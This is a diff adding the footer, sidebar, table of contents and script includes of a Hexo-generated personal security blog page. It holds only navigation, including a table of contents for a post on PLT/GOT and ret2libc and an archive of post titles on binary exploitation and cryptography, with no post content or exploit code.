+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+        
+    <script>
+        MathJax = {
+            tex: {
+                inlineMath: [['$', '$'], ['\\(', '\\)']],
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+            }
+        };
+    </script>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script>
+
+
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2163953074@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/symlPigeon" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                    
+                    <img class="profile-qr" src="/assets/qq.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//steamcommunity.com/id/LostinGensokyo/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#plt%E5%92%8Cgot%E8%A1%A8"><span class="toc-number">1.</span> <span class="toc-text">PLT和GOT表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2libc"><span class="toc-number">2.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 16
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span>
+            <a class="archive-post-title" href="/2022/03/30/stackoverflow-ret2libc/">栈溢出，ret2libc</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span>
+            <a class="archive-post-title" href="/2022/03/28/stackoverflow-learn/">关于栈溢出的一些东西（基本的）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span>
+            <a class="archive-post-title" href="/2022/03/23/mpc-gmw/">多方安全计算——GMW协议</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span>
+            <a class="archive-post-title" href="/2022/03/22/program-start/">关于一个ELF程序是怎么启动的这件事以及尝试分析然后大失败的结果</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span>
+            <a class="archive-post-title" href="/2022/03/16/wiener-attack/">Wiener's Attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span>
+            <a class="archive-post-title" href="/2022/02/23/mpc-2-gc/">安全多方计算——乱码电路协议</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/15</span>
+            <a class="archive-post-title" href="/2022/02/15/re-call/">关于x86调用惯例是啥这件事</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/10</span>
+            <a class="archive-post-title" href="/2022/02/10/re-review2/">ELF格式学习</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span>
+            <a class="archive-post-title" href="/2022/02/07/mpc-1/">安全多方计算——定义、原语</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/20</span>
+            <a class="archive-post-title" href="/2022/01/20/re-review1/">IA32内存、寄存器、数据</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/07</span>
+            <a class="archive-post-title" href="/2022/01/07/some-attack-on-rsa-I/">一些针对RSA的攻击（I）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span>
+            <a class="archive-post-title" href="/2022/01/02/cbc-padding-oracle-attack/">CBC Padding Oracle Attack</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2021 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/09</span>
+            <a class="archive-post-title" href="/2021/12/09/aes-ecb-attack/">Byte-at-a-time ECB Decryption</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span>
+            <a class="archive-post-title" href="/2021/12/06/CVE-2021-39503/">CVE-2021-39503复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2021/12/03/sm2/">国密SM2算法学习</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2021/12/03/HelloWorld/">HelloWorld</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="漏洞复现">
+                <span class="iconfont-archer">&#xe606;</span>
+                漏洞复现
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="对称密码和安全">
+                <span class="iconfont-archer">&#xe606;</span>
+                对称密码和安全
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ELF">
+                <span class="iconfont-archer">&#xe606;</span>
+                ELF
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向工程">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向工程
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="x86">
+                <span class="iconfont-archer">&#xe606;</span>
+                x86
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="公钥密码和数学">
+                <span class="iconfont-archer">&#xe606;</span>
+                公钥密码和数学
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="安全多方计算">
+                <span class="iconfont-archer">&#xe606;</span>
+                安全多方计算
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Linux">
+                <span class="iconfont-archer">&#xe606;</span>
+                Linux
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                Pwn
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Web安全">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Web安全
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="密码学">
+            <span class="iconfont-archer">&#xe60a;</span>
+            密码学
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="二进制">
+            <span class="iconfont-archer">&#xe60a;</span>
+            二进制
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMeta = {
+        url: "http://symlpigeon.github.io",
+        root: "/",
+        author: "symlPigeon"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20210823"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20210823"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
+        
+        <!-- mermaid -->
+        
+            <script src='https://cdn.jsdelivr.net/npm/mermaid@8.11.0/dist/mermaid.min.js'></script>
+            <script>
+                if (window.mermaid) {
+                    mermaid.initialize({theme: 'dark'});
+                }
+            </script>
+        
+    </body>
+</html>
